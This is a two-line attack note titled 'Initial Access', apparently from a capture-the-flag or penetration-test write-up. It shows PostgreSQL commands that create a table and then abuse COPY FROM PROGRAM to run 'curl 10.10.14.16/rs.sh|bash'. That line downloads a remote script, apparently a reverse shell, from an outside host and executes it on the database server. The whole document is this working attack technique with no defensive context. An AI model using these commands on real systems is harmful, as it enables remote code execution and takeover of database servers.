# Initial Access
- postgresql > `CREATE TABLE cmd_exec(cmd_output text);`
- postgresql > `COPY cmd_exec FROM PROGRAM 'curl 10.10.14.16/rs.sh|bash';`
